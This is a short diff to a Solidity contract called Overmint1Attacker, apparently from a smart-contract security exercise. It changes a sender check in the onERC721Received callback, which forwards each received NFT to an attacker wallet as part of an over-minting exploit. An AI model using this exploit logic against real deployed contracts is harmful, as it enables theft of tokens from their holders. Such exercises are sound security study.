@@ -23,7 +23,7 @@ contract Overmint1Attacker is IERC721Receiver {
         uint256 tokenId,
         bytes calldata data
     ) external returns (bytes4) {
-        // require(operator == address(i_victim));
+        require(msg.sender == address(i_victim));
 
         i_victim.transferFrom(address(this), i_attackerWallet, tokenId);
 
